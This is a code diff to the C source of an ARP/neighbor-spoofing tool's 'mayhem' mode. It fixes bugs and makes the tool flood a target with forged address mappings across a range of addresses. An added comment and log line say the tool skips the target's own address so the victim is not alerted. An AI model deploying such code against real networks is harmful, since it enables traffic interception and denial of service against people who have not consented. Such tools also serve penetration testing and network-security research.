@@ -20,7 +20,7 @@
 #include <macgonuts_thread.h>
 #include <macgonuts_types.h>
 
-#define MACGONUTS_SPFTD_NR 20
+#define MACGONUTS_SPFTD_NR 1
 
 struct macgonuts_spoofing_guidance_ctx g_Spfgd[MACGONUTS_SPFTD_NR] = { 0 };
 
@@ -117,7 +117,12 @@ int macgonuts_mayhem_task(void) {
     for (s = 0; s < MACGONUTS_SPFTD_NR && err == EXIT_SUCCESS; s++) {
         g_Spfgd[s].usrinfo.lo_iface = lo_iface;
         g_Spfgd[s].layers.proto_addr_version = ip_version;
+        g_Spfgd[s].layers.always_do_pktcraft = 1;
         err = fill_up_lo_info(&g_Spfgd[s]);
+        if (err != EXIT_SUCCESS) {
+            macgonuts_si_error("unable to fill up local information for spoofing task.\n");
+            return EXIT_FAILURE;
+        }
         g_Spfgd[s].handles.wire = macgonuts_create_socket(lo_iface, 1);
         if (g_Spfgd[s].handles.wire == -1) {
             err = EXIT_FAILURE;
@@ -135,9 +140,11 @@ int macgonuts_mayhem_task(void) {
             g_Spfgd[0].metainfo.arg[2] = (void *)no_route_range;
             g_Spfgd[0].spoofing.total = atoi(fake_pkts_amount);
             g_Spfgd[0].spoofing.timeout = atoi(timeout);
+            g_Spfgd[0].layers.proto_addr_size = (ip_version == 4) ? 4 : 16;
         } else {
             g_Spfgd[s].spoofing.total = g_Spfgd[0].spoofing.total;
             g_Spfgd[s].spoofing.timeout = g_Spfgd[0].spoofing.timeout;
+            g_Spfgd[s].layers.proto_addr_size = g_Spfgd[0].layers.proto_addr_size;
         }
         g_Spfgd[s].hooks.done = macgonuts_mayhem_done_hook;
     }
@@ -239,6 +246,7 @@ static int fill_up_tg_info(struct macgonuts_spoofing_guidance_ctx *spfgd) {
 
     if (err != EXIT_SUCCESS) {
         macgonuts_si_warn("unable to discover MAC address from `%s`, skipping it.\n", spfgd->usrinfo.tg_address);
+        return err;
     }
 
     return macgonuts_get_raw_ip_addr(&spfgd->layers.tg_proto_addr[0],
@@ -263,7 +271,7 @@ static int fill_up_lo_info(struct macgonuts_spoofing_guidance_ctx *spfgd) {
     }
 
     return macgonuts_get_gateway_hw_addr(&spfgd->layers.lo_hw_addr[0],
-                                         sizeof(&spfgd->layers.lo_hw_addr));
+                                         sizeof(spfgd->layers.lo_hw_addr));
 }
 
 static int sched_mayhem_unicast(void) {
@@ -273,26 +281,55 @@ static int sched_mayhem_unicast(void) {
     uint8_t curr_no_route_to[16] = { 0 };
     uint8_t end_no_route_to[16] = { 0 };
     size_t proto_addr_size = g_Spfgd[0].layers.proto_addr_size;
-    char tg_address[256] = "";
+    char tg_address[MACGONUTS_SPFTD_NR][256];
+    char spoof_address[MACGONUTS_SPFTD_NR][256];
 
     memcpy(&curr_no_route_to[0], (uint8_t *)g_Spfgd[0].metainfo.arg[0], proto_addr_size);
     memcpy(&end_no_route_to[0], (uint8_t *)g_Spfgd[0].metainfo.arg[1], proto_addr_size);
     macgonuts_inc_raw_ip(end_no_route_to, proto_addr_size);
 
-    err = macgonuts_raw_ip2literal(tg_address, sizeof(tg_address),
-                                   ((uint8_t **)&g_Spfgd[0].metainfo.arg[2])[0],
-                                   proto_addr_size);
-    if (err != EXIT_SUCCESS) {
-        macgonuts_si_error("unable to convert target ip address.\n");
-        return EXIT_FAILURE;
+
+    for (t = 0; t < MACGONUTS_SPFTD_NR; t++) {
+        err = macgonuts_raw_ip2literal(tg_address[t], sizeof(tg_address[t]),
+                                       ((uint8_t **)&g_Spfgd[0].metainfo.arg[2])[0],
+                                        proto_addr_size);
+        if (err != EXIT_SUCCESS) {
+            macgonuts_si_error("unable to convert target ip address.\n");
+            return EXIT_FAILURE;
+        }
+        g_Spfgd[t].usrinfo.tg_address = tg_address[t];
+        err = fill_up_tg_info(&g_Spfgd[t]);
+        if (err != EXIT_SUCCESS) {
+            macgonuts_si_warn("unable to fill up target's basic spoofing information.\n");
+            return EXIT_FAILURE;
+        }
     }
 
     while (memcmp(curr_no_route_to, end_no_route_to, proto_addr_size) != 0 && !should_exit()) {
         t = 0;
         do {
-            g_Spfgd[t].usrinfo.tg_address = tg_address;
+            if (memcmp(curr_no_route_to, g_Spfgd[t].layers.tg_proto_addr, proto_addr_size) == 0) {
+                // INFO(Rafael): Since some network stacks implementations have the ability of
+                //               warning user when there is another host using the same mac address
+                //               of her/him we will avoid spoofing the target address to keep the
+                //               attack more silent possible.
+                macgonuts_inc_raw_ip(curr_no_route_to, proto_addr_size);
+                macgonuts_si_warn("`%s` (a.k.a \"the target\") was skipped thus we do not warn up it "
+                                  "about the attack MuHauHauhAuHAuAHuaH!\n",
+                                  tg_address[t]);
+                continue;
+            }
             memcpy(&g_Spfgd[t].layers.spoof_proto_addr[0],
                    &curr_no_route_to[0], proto_addr_size);
+            err = macgonuts_raw_ip2literal(spoof_address[t], sizeof(spoof_address[t]),
+                                           &g_Spfgd[t].layers.spoof_proto_addr[0],
+                                           proto_addr_size);
+            if (err != EXIT_SUCCESS) {
+                macgonuts_si_warn("unable to convert spoof ip address.\n");
+                t++;
+                continue;
+            }
+            g_Spfgd[t].usrinfo.spoof_address = spoof_address[t];
             if (macgonuts_create_thread(&td[t], mayhem_unicast_tdr, &g_Spfgd[t]) != EXIT_SUCCESS) {
                 macgonuts_si_warn("unable to create spoofing thread.\n");
             }
@@ -336,15 +373,10 @@ static void *mayhem_unicast_tdr(void *args) {
                                         spfgd->usrinfo.tg_address,
                                         strlen(spfgd->usrinfo.tg_address));
     size_t t;
+    size_t success_nr = 0;
 
     if (err != EXIT_SUCCESS) {
         macgonuts_si_warn("unable to convert target address.\n");
-        return NULL;
-    }
-
-    err = fill_up_tg_info(spfgd);
-    if (err != EXIT_SUCCESS) {
-        macgonuts_si_warn("unable to fill up target's basic spoofing information.\n");
         return NULL;
     }
 
@@ -354,9 +386,17 @@ static void *mayhem_unicast_tdr(void *args) {
             macgonuts_si_warn("unable to send spoofing packet.\n");
             continue;
         }
+        success_nr += (err == EXIT_SUCCESS);
         if (spfgd->spoofing.timeout > 0) {
             usleep(spfgd->spoofing.timeout * 1000);
         }
+    }
+
+    if (success_nr > 0) {
+        spfgd->hooks.done(spfgd, NULL, 0);
+    } else {
+        macgonuts_si_error("any spoofing packet related to `%s` could be send to `%s`.\n", spfgd->usrinfo.spoof_address,
+                                                                                           spfgd->usrinfo.tg_address);
     }
 
     return NULL;
@@ -401,6 +441,7 @@ static struct mayhem_tgt_addr_ctx **parse_target_addr_list(const char **usr_data
             err = EXIT_FAILURE;
         }
         usr_data_item++;
+        lp++;
     }
 
     if (err != EXIT_SUCCESS && list != NULL) {
@@ -420,7 +461,7 @@ static void free_target_addr_list(struct mayhem_tgt_addr_ctx **list, const size_
         }
         lp++;
     }
-    free(lp);
+    free(list);
 }
 
 static int should_exit(void) {
@@ -463,5 +504,5 @@ static void sigint_watchdog(int signr) {
         return;
     }
     g_Spfgd[0].spoofing.abort = 1;
-    macgonuts_mutex_lock(&g_Spfgd[0].handles.lock);
+    macgonuts_mutex_unlock(&g_Spfgd[0].handles.lock);
 }
